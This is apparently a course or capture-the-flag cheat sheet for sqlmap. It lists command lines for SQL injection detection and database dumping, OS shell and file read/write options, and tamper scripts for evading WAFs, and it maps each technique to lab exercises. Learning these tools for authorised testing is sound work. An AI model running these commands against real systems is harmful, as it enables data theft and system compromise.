# sqlmap

Automates detection and extraction. Great to confirm/dump; understand the manual technique too
(write-ups need it, and custom oracles sometimes beat sqlmap).

```bash
sqlmap -u "$T/search?q=x" --batch                          # GET param
sqlmap -u "$T/login" --data 'username=a&password=b' -p username --batch
sqlmap -u "$T/photo/1*" --batch                            # * marks injection point in the path
sqlmap -r req.txt --batch                                  # raw request saved from Burp
sqlmap ... --cookie 'session=...; security=low'
sqlmap ... --dbs | --tables -D db | --dump -T vault -D db | --dump-all --exclude-sysdbs
sqlmap ... --sql-query "SELECT secret FROM vault"
```
| Option | Use |
|---|---|
| `--technique=BEUSTQ` | Boolean, Error, Union, Stacked, Time, inline Query — restrict to what fits |
| `--dbms sqlite\|mysql\|postgresql` | skip fingerprinting |
| `--level 3 --risk 2` | test more places/payloads (cookies, headers, OR-based) |
| `--string 'text'` / `--not-string` / `--code 200` | tell it the TRUE condition (count/marker oracles) |
| `--prefix "zzz'" --suffix "-- "` | custom context |
| `--time-sec 1` | faster time-based |
| `--second-url URL` | second-order: result shown on another page |
| `--os-shell` / `--file-read /flag/flag` / `--file-write` | when privileges allow |
| `--tamper space2comment,between,randomcase` | WAF/filter evasion |
| `--flush-session` | forget cached results |

Course mapping: sqli2 `--technique E`, sqli3 `--technique U`, sqli4/5 `--technique B --string ...`,
sqli6 `--technique T` (INSERT context — may need `--prefix`), sqli7/8 need manual work.
